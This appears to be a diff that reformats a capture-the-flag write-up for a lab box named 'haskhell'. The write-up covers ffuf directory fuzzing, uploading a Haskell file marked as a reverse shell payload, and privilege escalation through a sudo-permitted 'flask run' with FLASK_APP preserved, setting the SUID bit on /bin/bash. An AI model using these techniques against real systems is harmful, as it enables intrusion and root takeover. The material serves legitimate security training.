@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 5001 | HTTP    |
+| 22 | SSH |
+| 5001 | HTTP |
 
 
 
@@ -38,31 +38,31 @@ If we fuzz, we can find the submit directory in which we can upload a `haskell` 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.110.142:5001/FUZZ" -ic -c -t 200\
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.110.142:5001/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://10.10.110.142:5001/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
-submit                  [Status: 200, Size: 237, Words: 48, Lines: 9, Duration: 655ms]
+submit [Status: 200, Size: 237, Words: 48, Lines: 9, Duration: 655ms]
 
 ```
 
 
-A Haskell file (with theÂ `.hs`Â extension) is a text file containing code written in the Haskell programming language, a purely functional, statically typed language. These files are used to define functions, data types, and program logic. When compiled or interpreted, the code is executed to perform tasks.
+A Haskell file (with the`.hs` extension) is a text file containing code written in the Haskell programming language, a purely functional, statically typed language. These files are used to define functions, data types, and program logic. When compiled or interpreted, the code is executed to perform tasks.
 
 Based on that, we can begin exploitation.
 
@@ -98,9 +98,9 @@ range x y = [x..y]
 
 grey :: Int -> [String]
 grey n
-    | n <= 0    = [""]
-    | otherwise = map ('0':) prev ++ map ('1':) (reverse prev)
-    where prev = grey (n-1)
+ | n <= 0 = [""]
+ | otherwise = map ('0':) prev ++ map ('1':) (reverse prev)
+ where prev = grey (n-1)
 
 -- Reverse shell payload (adjust IP/PORT)
 main :: IO ()
@@ -149,10 +149,10 @@ If we check our sudo privileges, we can notice this:
 ```
 prof@haskhell:~$ sudo -l
 Matching Defaults entries for prof on haskhell:
-    env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User prof may run the following commands on haskhell:
-    (root) NOPASSWD: /usr/bin/flask run
+ (root) NOPASSWD: /usr/bin/flask run
 ```
 
 Let's read the script:
@@ -168,15 +168,15 @@ import sys
 from pkg_resources import load_entry_point
 
 if __name__ == '__main__':
-    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
-    sys.exit(
-        load_entry_point('Flask==0.12.2', 'console_scripts', 'flask')()
-    )
+ sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
+ sys.exit(
+ load_entry_point('Flask==0.12.2', 'console_scripts', 'flask')()
+ )
 ```
 
 
-- TheÂ `FLASK_APP`Â environment variable is preserved due toÂ `env_keep`Â in the sudoers configuration. 
-- By pointingÂ `FLASK_APP`Â to a malicious script, Flask executes it as root whenÂ `sudo flask run`Â is called.
+- The`FLASK_APP` environment variable is preserved due to`env_keep` in the sudoers configuration. 
+- By pointing`FLASK_APP` to a malicious script, Flask executes it as root when`sudo flask run` is called.
 - This bypasses restrictions because the script runs in the context of the Flask process (owned by root).
 
 So, we can do the following:
@@ -185,7 +185,7 @@ So, we can do the following:
 
 ```python
 import os
-os.system('chmod u+s /bin/bash')  # Set SUID bit on /bin/bash
+os.system('chmod u+s /bin/bash') # Set SUID bit on /bin/bash
 ```
 
 2, Set the environment variable:
